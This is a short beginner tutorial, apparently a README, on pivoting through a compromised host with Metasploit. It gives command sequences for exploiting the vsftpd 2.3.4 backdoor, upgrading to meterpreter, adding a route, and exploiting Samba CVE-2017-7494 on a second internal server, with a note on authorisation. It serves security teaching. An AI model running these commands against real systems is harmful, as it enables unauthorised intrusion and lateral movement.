# basic-pivoting-with-metasploit

Basic Pivoting By Using Metasploit

This is a very basic demo or tutorial (for beginner) on how to use Metasploit to conduct Pivoting.

By referring to the definition of Pivoting from Offensive Security:

Pivoting is the unique technique of using an instance (also referred to as a ‘plant’ or ‘foothold’) to be able to move around inside a network. Basically using the first compromise to allow and even aid in the compromise of other otherwise inaccessible systems.

In simple words, that is to use one exploited machine as a gateway to access other machines in the same network or other networks that you don’t have direct network route access.

Let’s take below scenario as an example, we now have the network access to Server A, but not Server B. If we could exploit Server A successfully, then we could access Server B by using Server A as our gateway, so that we could further exploit Server B.
Simple Network Diagram

Before we start any security testing / penetration testing / red teaming / exploiting any vulnerabilities (whatever you name it), please make sure you have ALL necessary authorisation from corresponding parties or you should do it within your own self-contained testing environment.

In this demo, the focus is on Pivoting By Using Metasploit, you may find the vulnerabilities on both Server A and Server B are relatively outdated.

Let’s start with a quick NMAP scan to our first target – Server A:

nmap -sV 192.47.155.3

It is quite obvious the vsftpd could be exploitable. Let’s search for available exploit for vsftp:

search vsftp
exploit/unix/ftp/vsftpd_234_backdoor
set rhosts 192.47.155.3
run

Woo! Server A exploited successfully and root obtained directly! We found that Server A has another interface eth1: 192.104.39.2 as well.

Let’s put this obtained session into background (Ctrl + z) first.

To conduct pivoting, we need to upgrade the shell to meterpreter:

use post/multi/manage/shell_to_meterpreter
set session 2
run

Now we have session 5 (meterpreter to Server A’s eth0 – 192,47.155.3).

This is the key part of this demo – pivoting.

Jump to session 5 and add the route!

sessions 5
run post/multi/manage/autoroute SUBNET=192.104.39.0 ACTION=ADD

Now we have to put our current session into background (Ctrl + z).

Now we could conduct tcp port scan to Server B (192.104.39.3) within Metasploit, as pivoting is in place.

use auxiliary/scanner/portscan/tcp
set rhosts 192.104.39.3
set threads 10
run

Further conducting SMB scan.

use auxiliary/scanner/smb/smb_version
set rhosts 192.104.39.3
run

As Samba 4.3.8-Ubuntu has the vulnerability CVE-2017-7494, let’s try it.

search CVE-2017-7494
use exploit/linux/samba/is_known_pipename
set rhosts 192.104.39.3
run

Yeah! Server B exploited!

Hope this simple demo / tutorial could help beginner to learn about Pivoting. Thanks for reading!

Cheers
